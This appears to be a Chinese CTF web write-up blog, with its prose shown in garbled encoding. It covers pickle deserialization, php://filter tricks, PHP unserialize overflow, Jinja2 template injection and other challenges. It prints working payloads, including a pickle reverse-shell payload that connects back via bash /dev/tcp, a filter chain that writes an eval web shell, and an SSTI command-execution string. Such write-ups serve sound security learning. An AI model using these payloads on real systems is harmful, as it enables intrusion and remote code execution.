<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3.6</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">    <span class="string">&#x27;__reduce__&#x27;</span>: <span class="keyword">lambda</span> o: (os.system,(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/7777 0&gt;&amp;1&#x27;&quot;</span>,))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">u = pickle.dumps(User())</span><br><span class="line"><span class="built_in">print</span>(b64encode(u).decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>flask-session ä¼ªé€ </code></p>
<p><img src="https://img-blog.csdnimg.cn/6fbbf284a9dd44b5ae70566c1e1609c5.png" alt="img"></p>
<p>æ ¹æ®å½¢å¼å°†ä¸Šé¢expå¾—åˆ°çš„å†…å®¹æ”¾è¿›å»å¹¶åˆ©ç”¨å¯†é’¥è¿›è¡ŒåŠ å¯†</p>
<p><img src="https://img-blog.csdnimg.cn/9ec455b9804040658958df717eda7b64.png" alt="img"></p>
<p>æœ€åæŠ“åŒ…ï¼Œè®¿é—®<code>/admin</code>ä¿®æ”¹sessionï¼Œåœ¨vpsä¸Šè¿›è¡Œç›‘å¬</p>
<p>å°±å¯ä»¥å•¦</p>
<p><img src="https://img-blog.csdnimg.cn/ea28f9e9c0f0436a9fb9f091bde072d0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h4 id="watevrCTF-2019-Pickle-Store"><a href="#watevrCTF-2019-Pickle-Store" class="headerlink" title="[watevrCTF-2019]Pickle Store"></a>[watevrCTF-2019]Pickle Store</h4><ul>
<li>python pickleåºåˆ—åŒ–</li>
</ul>
<p>ä¸€çœ‹é¢˜ç›®å°±èƒ½çŸ¥é“æ˜¯pythonåºåˆ—åŒ–å’Œååºåˆ—åŒ–äº†ï¼Œå¯ä»¥æŸ¥çœ‹åˆ°sessionï¼Œè¿›è¡Œbase4è§£ç ä¹‹åæ˜¯ä¹±ç ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç›´æ¥è¿›è¡Œååºåˆ—åŒ–</p>
<p><img src="https://img-blog.csdnimg.cn/e1e89602e4394c93b38d79a2b5237715.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> _pickle</span><br><span class="line"><span class="built_in">print</span>(_pickle.loads(base64.b64decode(<span class="string">&#x27;gAN9cQAoWAUAAABtb25leXEBTZABWAcAAABoaXN0b3J5cQJdcQNYFAAAAFl1bW15IHNtw7ZyZ8Olc2d1cmthcQRhWBAAAABhbnRpX3RhbXBlcl9obWFjcQVYIAAAADQ2NGZiNTE5ZWNjZDkwMDM3Y2E4MDczMTlkNDU3ODZkcQZ1Lg==&#x27;</span>)))</span><br><span class="line"><span class="comment">#&#123;&#x27;money&#x27;: 400, &#x27;history&#x27;: [&#x27;Yummy smÃ¶rgÃ¥sgurka&#x27;], &#x27;anti_tamper_hmac&#x27;: &#x27;464fb519eccd90037ca807319d45786d&#x27;&#125;</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çŒœæµ‹åç«¯å­˜åœ¨base64è§£ç ä¹‹åçš„ååºåˆ—åŒ–ï¼Œé‚£ä¹ˆç›´æ¥ä¸Šexpï¼šï¼ˆä¸Šé¢˜çš„expä»ç„¶é€‚ç”¨ åœ¨linux python2ä¸­</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3.6</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">    <span class="string">&#x27;__reduce__&#x27;</span>: <span class="keyword">lambda</span> o: (os.system,(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/7777 0&gt;&amp;1&#x27;&quot;</span>,))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">u = pickle.dumps(User())</span><br><span class="line"><span class="built_in">print</span>(b64encode(u).decode())</span><br></pre></td></tr></table></figure>

<p>åœ¨vpsä¸Šç›‘å¬ï¼ŒæŠ“åŒ…</p>
<p><img src="https://img-blog.csdnimg.cn/5cdab4bd0ffa443b870b763111c8d9d2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h4 id="WMCTF2020-Web-Check-in-2-0"><a href="#WMCTF2020-Web-Check-in-2-0" class="headerlink" title="[WMCTF2020]Web Check in 2.0"></a>[WMCTF2020]Web Check in 2.0</h4><ul>
<li>php</li>
</ul>
<p><a href="https://github.com/wm-team/WMCTF2020-WriteUp/blob/master/WMCTF%202020%E5%AE%98%E6%96%B9WriteUp.md">å‚è€ƒ</a></p>
<p>æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//PHP 7.0.33 Apache/2.4.25</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$sandbox</span> = <span class="string">&#x27;/var/www/html/sandbox/&#x27;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">@mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">@chdir(<span class="variable">$sandbox</span>); </span><br><span class="line">var_dump(<span class="string">&quot;Sandbox:&quot;</span>.<span class="variable">$sandbox</span>); <span class="comment">#å½“å‰è·¯å¾„</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/iconv|UCS|UTF|rot|quoted|base64/i&#x27;</span>,<span class="variable">$content</span>)) <span class="comment"># banäº†phpä¼ªåè®®ç”¨åˆ°çš„ä¸€äº›å…³é”®è¯</span></span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$content</span>)) </span><br><span class="line">        <span class="keyword">require_once</span>(<span class="variable">$content</span>);</span><br><span class="line">    file_put_contents(<span class="variable">$content</span>,<span class="string">&#x27;&lt;?php exit();&#x27;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å®¡è®¡ä»£ç ä¹‹åå¯ä»¥æƒ³åˆ°åˆ©ç”¨ç‚¹åœ¨äº<code>file_put_contents($content,&#39;&lt;?php exit();&#39;.$content);</code>ï¼Œä¹‹å‰åšè¿‡ç±»ä¼¼çš„ä½¿ç”¨<code>php://filter</code>è¿‡æ»¤å™¨çš„base64ï¼Œç›´æ¥æŠŠå‰é¢çš„exit()ç»•è¿‡ï¼Œä½†æ˜¯è¿™æ¬¡base64è¢«banäº†ï¼Œåªèƒ½åˆ©ç”¨å…¶ä»–è¿‡æ»¤å™¨</p>
<p><a href="https://segmentfault.com/a/1190000018991087#item-2">php://filter</a>åœ¨è¿™é‡Œå¯ä»¥æ‰¾åˆ°å¯åˆ©ç”¨çš„</p>
<blockquote>
<p><img src="https://img-blog.csdnimg.cn/c9041e2332f9497fa28888e250d60e10.png" alt="img"></p>
</blockquote>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[&#x27;cmd&#x27;]);?&gt;/resource=a.php</span><br></pre></td></tr></table></figure>

<p>ä¹‹ååˆ©ç”¨å·²çŸ¥çš„è·¯å¾„å»è®¿é—®<code>a.php</code>ï¼Œåˆ©ç”¨shellå¾—åˆ°flag</p>
<h4 id="è“å¸½æ¯-2021-One-Pointer-PHPï¼ˆæœªå­¦å®Œï¼‰"><a href="#è“å¸½æ¯-2021-One-Pointer-PHPï¼ˆæœªå­¦å®Œï¼‰" class="headerlink" title="[è“å¸½æ¯ 2021]One Pointer PHPï¼ˆæœªå­¦å®Œï¼‰"></a>[è“å¸½æ¯ 2021]One Pointer PHPï¼ˆæœªå­¦å®Œï¼‰</h4><p>ç»™äº†æºç ï¼š</p>
<p><code>add_api.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>=unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line">	<span class="variable">$count</span>[++<span class="variable">$user</span>-&gt;count]=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$count</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="variable">$user</span>-&gt;count+=<span class="number">1</span>;</span><br><span class="line">		setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$user</span>=<span class="keyword">new</span> User;</span><br><span class="line">	<span class="variable">$user</span>-&gt;count=<span class="number">1</span>;</span><br><span class="line">	setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆå®¡è®¡ä»£ç ï¼Œå¯ä»¥çŸ¥é“æˆ‘ä»¬è¦ç»•è¿‡<code>if($count[]=1)</code></p>
<p>è¿™é‡Œåˆ©ç”¨intæº¢å‡ºå°±å¯ä»¥äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// $c=9223372036854775806;</span></span><br><span class="line"><span class="comment">// $count[++$c]=1;</span></span><br><span class="line"><span class="comment">// if($count[]=1)&#123;</span></span><br><span class="line"><span class="comment">//     $c+=1;</span></span><br><span class="line"><span class="comment">//     var_dump($count);</span></span><br><span class="line"><span class="comment">// &#125;else&#123;</span></span><br><span class="line"><span class="comment">//     system(&#x27;whoami&#x27;);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// use User as GlobalUser;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$count</span> = <span class="number">9223372036854775806</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $data  = &#x27;O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A1%3B%7D&#x27;;</span></span><br><span class="line"><span class="comment">// var_dump(unserialize(urldecode($data)));</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> User()));</span><br></pre></td></tr></table></figure>

<p>æŠ“åŒ…ä¿®æ”¹cookieä¹‹åï¼Œgetä¼ <code>backdoor</code>ï¼Œä½†æ˜¯å‘ç°å¥½å¤šå‡½æ•°å’Œç±»éƒ½è¢«banäº†ï¼Œä¹‹åå»å‚è€ƒåˆ«çš„å¸ˆå‚…çš„wpï¼Œä½†æ˜¯å‘ç°å¥½å¤šè¦å­¦ä¹ çš„ç‚¹ï¼ˆ</p>
<p><img src="https://img-blog.csdnimg.cn/9f377ede4e1d4feca2282f2a033ef63c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
]]></content>
      <categories>
        <category>é›†è®­</category>
      </categories>
      <tags>
        <tag>buuåˆ·é¢˜</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>n3ctf_web_wp</title>
    <url>/2022/01/21/n3ctf-wp/</url>
    <content><![CDATA[<h5 id="00-F12"><a href="#00-F12" class="headerlink" title="00-F12"></a>00-F12</h5><p>ç­¾åˆ°ï¼ŒF12çœ‹jsæºç ï¼ŒæŸ¥æ‰¾flagå°±å¯ä»¥æ‰¾åˆ°äº†</p>
<h5 id="01-headers"><a href="#01-headers" class="headerlink" title="01-headers"></a>01-headers</h5><p>ï¼ˆèµ›åå¤ç°çš„ æ‰“å‡ºæ¥ä¹‹åçœŸçš„è§‰å¾—è‡ªå·±è¿˜æ˜¯å¤ªèœäº†</p>
<p>è¿™é“é¢˜å­˜åœ¨ä¿¡æ¯æ³„éœ²ï¼Œç®€å•çš„<code>robots.txt</code>ï¼ˆå“</p>
<p>ç„¶åè¿›å…¥<code>ydswantmanygfs.php</code>ï¼Œç›´æ¥è¯´<code>You are not from yoshino-s.online</code>ï¼Œé‚£ä¹ˆç›´æ¥æŠ“åŒ…å§</p>
<p>å¯ä»¥åœ¨å¤´ä¿¡æ¯ä¸­å‘ç°ä¸€ä¸ªhintï¼š<code> How to get remote ip</code></p>
<p>å…ˆè¯•ç€ç”¨XFFä¼ <code>yoshino-s.online</code>ï¼Œä½†æ˜¯é¡µé¢æ²¡æœ‰æ”¹å˜ï¼Œé‚£ä¹ˆè¯´æ˜ç°åœ¨å°±è¦åˆ©ç”¨hintï¼Œremote ipä¹Ÿå°±æ˜¯å‘å‡ºè¯·æ±‚çš„ä¸»æœºipï¼Œé‚£ä¹ˆpingä¸€ä¸‹å§</p>
<p><img src="https://img-blog.csdnimg.cn/809c88f292764c74b9f624287d05aa16.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>XFFæ¢æˆ<code>47.116.142.11</code>å°±å¯ä»¥å¾—åˆ°flagäº†</p>
<span id="more"></span>

<h5 id="02-cookies"><a href="#02-cookies" class="headerlink" title="02-cookies"></a>02-cookies</h5><p>ç©äº†ä¸€ä¼šä¹‹åå¯ä»¥å‘ç°cookieé‡Œé¢æœ‰scoreçš„å€¼</p>
<p>å¯ä»¥ç›´æ¥æ‹¿å»è§£ç ï¼Œè¿™é‡Œçš„<code>%3d</code>æ˜¯<code>=</code>ï¼Œæ‰€ä»¥å¯ä»¥å…ˆçŒœæµ‹æ˜¯base64</p>
<p><img src="https://img-blog.csdnimg.cn/62729a4795ec45c488e111424bc6158d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>Gunzipè§£å¯†ä¹‹åå°±æ˜¯æˆ‘ä»¬åŸæœ¬çš„æˆç»©äº†</p>
<p>ç›´æ¥ç™¾åº¦ï¼Œå¯ä»¥çŸ¥é“åŠ å¯†æ–¹å¼æ˜¯<code>Gzip</code></p>
<p>é‚£ä¹ˆå°±ç›´æ¥ç”¨301ä¸€æ­¥ä¸€æ­¥åŠ å¯†å›å»ï¼Œåœ¨score.phpç•Œé¢æŠ“åŒ…ï¼Œä¿®æ”¹ä¸€ä¸‹sessionå°±å¥½äº†</p>
<p>payloao:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">H4sIAGWo6WEA/wXAAQkAAADCsEoe+3cbXwAStPRXAwAAAA==</span><br></pre></td></tr></table></figure>



<h5 id="04-template"><a href="#04-template" class="headerlink" title="04-template"></a>04-template</h5><p>æ²¡æœ‰ä»»ä½•è¿‡æ»¤çš„æ¨¡æ¿æ³¨å…¥</p>
<p>jinjia</p>
<p>ç›´æ¥æ‰“payloadå°±å¥½äº†ï¼Œè¿™é‡Œé€‰æ‹©<code>catch_warnings</code>ï¼Œç›´æ¥å†™ä¸ªè„šæœ¬æ‰¾å§ï¼Œå®åœ¨ä¸è¡Œä¸€ä¸ªä¸€ä¸ªæ•°</p>
<p>payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[213].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="05-php"><a href="#05-php" class="headerlink" title="05-php"></a>05-php</h5><p>é™‡åŸæˆ˜å½¹çš„é¢˜ç›®ï¼Œä½†æ˜¯è¢«æ”¹è¿‡äº†ï¼Œç›´æ¥çœ‹hintçš„phpinfoå°±å¯ä»¥æ‰¾åˆ°flag</p>
<p>payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:4:&quot;Hint&quot;:0:&#123;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Ezhttpd"><a href="#Ezhttpd" class="headerlink" title="Ezhttpd"></a>Ezhttpd</h5><p>ç®€å•çš„ä»£ç å®¡è®¡</p>
<p>å°±ä»¥åˆšçœ‹åˆ°è¿™é“é¢˜çš„æ—¶å€™çš„é¡ºåºï¼Œæˆ‘ä»¬ä¸€ä¸ªä¸€ä¸ªæ–‡ä»¶å®¡è®¡ï¼š</p>
<p><strong>0x01:index.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">define(<span class="string">&quot;main&quot;</span>,<span class="string">&quot;main&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;evil.php&quot;</span>;</span><br><span class="line"><span class="variable">$temp</span> = <span class="keyword">new</span> Temp(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="variable">$temp</span>-&gt;display(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>åŒ…å« <code>evil.php</code>ï¼Œå®ä¾‹åŒ–<code>Temp</code>ç±»ï¼Œpostä¼ å€¼ï¼Œgetä¼ filenameåˆ°displayå‡½æ•°ä¸­</p>
<p><strong>0x02:evil.php</strong></p>
<p>// é‡ç‚¹ï¼ï¼  çœ‹å®Œè¿˜æ˜¯å¯¹æ–¹æ³•æœ‰å›°æƒ‘çš„å¯ä»¥ç™¾åº¦  â€œphpé­”æœ¯æ–¹æ³•â€  ç”šè‡³å¯ä»¥å»è‡ªå­¦é¢å‘å¯¹è±¡</p>
<p>1.è¿™é‡Œä¸»è¦å°±æ˜¯<code>Temp</code>ç±»ï¼ŒæŸ¥çœ‹é€ä¸ªæ–¹æ³•</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;date = array_merge(<span class="keyword">$this</span>-&gt;date,<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>__construct</code> æ„é€ æ–¹æ³•ï¼Œåœ¨å®ä¾‹åŒ–ç±»çš„æ—¶å€™è‡ªåŠ¨è°ƒç”¨ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬åœ¨index.phpåˆ©ç”¨postä¼ çš„å€¼å°±æ˜¯è¿™é‡Œ$dataçš„å€¼ï¼›</p>
<p><code>array_merge</code>åˆå¹¶ä¸¤ä¸ªæ•°ç»„ï¼›</p>
<p>2.<code>getTempName</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getTempName</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$dir</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$dir</span> === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;template = str_replace(<span class="string">&#x27;..&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;./template/admin/&#x27;</span>.<span class="variable">$template</span>);</span><br><span class="line">        <span class="keyword">if</span>(!is_file(<span class="keyword">$this</span>-&gt;template))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;no!!&quot;</span>);</span><br><span class="line">         &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;template = <span class="string">&#x27;./template/index.html&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¼ å…¥ç›¸åº”å‚æ•°ï¼Œè¦æ±‚<code>$dir===&#39;admin&#39;</code>å¹¶ä¿®æ”¹<code>$this-&gt;template</code>çš„å€¼ï¼›</p>
<p><code>str_replace</code>å­—ç¬¦ä¸²æ›¿æ¢å‡½æ•°ï¼›</p>
<p>3.<code>display</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$space</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">        extract(<span class="keyword">$this</span>-&gt;date);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;getTempName(<span class="variable">$template</span>,<span class="variable">$space</span>);</span><br><span class="line">        <span class="keyword">include</span>(<span class="keyword">$this</span>-&gt;template);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>extract</code>å¯¹<code>$this-&gt;data</code>çš„å€¼è¿›è¡Œå˜é‡è¦†ç›–ï¼š</p>
<p>ä¹‹åè°ƒç”¨<code>getTempName</code>æ–¹æ³•ï¼Œè¿™é‡Œæˆ‘ä»¬ä¼šæŠŠdisplayé»˜è®¤çš„å‚æ•°<code>$space</code>å†æ¬¡ä¼ å…¥<code>getTemlName</code>ï¼Œåˆ«å¿˜äº†æˆ‘ä»¬ä¹‹å‰å®¡è®¡çš„ä»£ç ä¸­è¦æ±‚ä¼ å…¥çš„ç¬¬äºŒä¸ªå‚æ•°è¦ä¸º<code>admin</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œä¹Ÿè¦å®ç°å¯¹spaceçš„ä¿®æ”¹ï¼Œè€Œç”±äºæœ‰å˜é‡è¦†ç›–ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨postä¼ sapceä¸ºadminï¼Œä»è€Œä½¿å¾—spaceè¿›å…¥<code>$this-&gt;date</code>ï¼Œå®ç°åœ¨å˜é‡è¦†ç›–çš„æ—¶å€™è€Œæ–¹æ³•ä¸­å¯¹<code>$this-&gt;template</code>è¿›è¡Œäº†ä¿®æ”¹ï¼Œå¹¶åœ¨æœ€ååŒ…å«<code>$this-&gt;template</code>è¡¨ç¤ºçš„æ–‡ä»¶</p>
<p>4.<code>listdata</code></p>
<p>è¿™ä¸ªæ–¹æ³•ä¸œè¥¿æœ‰ç‚¹å¤šï¼Œæˆ‘å°±æŠŠæœ€ä¸»è¦çš„æ‹¿å‡ºæ¥å§</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$params</span> = explode(<span class="string">&#x27; &#x27;</span>, <span class="variable">$_params</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$t</span>) &#123;</span><br><span class="line">    <span class="variable">$var</span> = substr(<span class="variable">$t</span>, <span class="number">0</span>, strpos(<span class="variable">$t</span>, <span class="string">&#x27;=&#x27;</span>));</span><br><span class="line">    <span class="variable">$val</span> = substr(<span class="variable">$t</span>, strpos(<span class="variable">$t</span>, <span class="string">&#x27;=&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$var</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$system</span>[<span class="variable">$var</span>])) &#123;</span><br><span class="line">         <span class="variable">$system</span>[<span class="variable">$var</span>] = <span class="variable">$val</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="variable">$param</span>[<span class="variable">$var</span>] = <span class="variable">$val</span>; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;function&#x27;</span>: </span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span>  <span class="string">&#x27;nameå‚æ•°ä¸å­˜åœ¨&#x27;</span>;</span><br><span class="line">     &#125; <span class="keyword">elseif</span> (!function_exists(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="string">&#x27;å‡½æ•°[&#x27;</span>.<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&#x27;]æœªå®šä¹‰&#x27;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="variable">$force</span> = <span class="variable">$param</span>[<span class="string">&#x27;force&#x27;</span>];</span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$force</span>) &#123;</span><br><span class="line">         <span class="variable">$p</span> = [];</span><br><span class="line">         <span class="keyword">foreach</span> (<span class="variable">$param</span> <span class="keyword">as</span> <span class="variable">$var</span> =&gt; <span class="variable">$t</span>) &#123;</span><br><span class="line">             <span class="keyword">if</span> (strpos(<span class="variable">$var</span>, <span class="string">&#x27;param&#x27;</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">                 <span class="variable">$n</span> = intval(substr(<span class="variable">$var</span>, <span class="number">5</span>));</span><br><span class="line">                 <span class="variable">$p</span>[<span class="variable">$n</span>] = <span class="variable">$t</span>;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> (<span class="variable">$p</span>) &#123;</span><br><span class="line">              <span class="variable">$rt</span> = call_user_func_array(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>], <span class="variable">$p</span>);</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="variable">$rt</span> = call_user_func(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">          &#125;</span><br><span class="line">         <span class="keyword">return</span> <span class="variable">$rt</span>;</span><br><span class="line">     &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

<p><code>explode</code>å°†<code>$_params</code>ä»¥ç©ºæ ¼è¿›è¡Œåˆ†å‰²å¹¶è¿”å›æ•°ç»„å½¢å¼ï¼Œä½¿å¾—ä¹‹åçš„éå†å’Œèµ‹å€¼å¾—ä»¥å®ç°ï¼ˆè‡ªå·±å»çœ‹æºç ç†è§£</p>
<p>æ¥ä¸‹å»ç¬¬ä¸€æ®µï¼Œåˆ¤æ–­<code>$param[&#39;name&#39;]</code>æ˜¯å¦ä¸ºå®šä¹‰å¹¶ä¸”æ˜¯å¦ä¸ºå‡½æ•°ï¼›</p>
